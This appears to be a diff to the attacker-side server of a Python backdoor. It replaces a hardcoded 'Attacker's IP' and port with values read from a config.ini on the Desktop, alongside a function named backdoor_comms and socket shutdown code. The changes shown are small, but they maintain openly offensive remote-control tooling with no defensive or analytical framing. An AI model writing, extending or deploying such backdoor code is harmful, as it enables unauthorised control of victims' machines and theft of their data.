@@ -1,8 +1,14 @@
 import socket
 import sys
+import configparser
+import os
 
-HOST = "000.000.000.000" # Attacker's IP
-PORT = 1234
+config_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'config.ini')
+config = configparser.ConfigParser()
+config.read(config_path)
+
+HOST = config['Server']['address']
+PORT = int(config['Server']['port'])
 BUFFER = 4096
 SEP = "<sep>"
 
@@ -33,7 +39,6 @@ def backdoor_comms(conn):
         print(f"[-] Error in communication: {str(exception)}")
     finally:
         conn.close()
-
 
 def main():
     try:
@@ -67,7 +72,6 @@ def main():
         if 'server_sock' in locals():
             server_sock.close()
         print("[*] Server shutdown complete")
-
 
 if __name__ == "__main__":
     main()
